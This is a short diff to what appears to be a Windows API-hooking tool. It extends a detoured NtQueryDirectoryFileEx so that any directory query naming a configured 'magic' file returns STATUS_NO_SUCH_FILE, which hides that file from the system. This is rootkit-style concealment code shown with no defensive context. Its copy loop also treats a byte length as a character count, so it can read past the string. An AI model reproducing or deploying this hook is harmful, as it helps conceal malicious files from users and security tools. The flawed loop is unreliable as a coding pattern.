@@ -422,6 +422,17 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
 
 	if (NT_SUCCESS(OriginalStatus)) {
+		if (FileName != nullptr) {
+			// check whether the user-supplied FileName query contains the filename that we want to hide, if yes, return File Not Found
+			WCHAR TempBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
+				TempBuffer[i] = FileName->Buffer[i];
+			}
+			if (wcsstr(TempBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+				return STATUS_NO_SUCH_FILE;
+			}
+		}
+
 		// if the call succeeded and the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63], cast the buffer pointer to an appropriate structure and read it
 		if (FileInformationClass == 1) {
 			PFILE_DIRECTORY_INFORMATION FileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation;
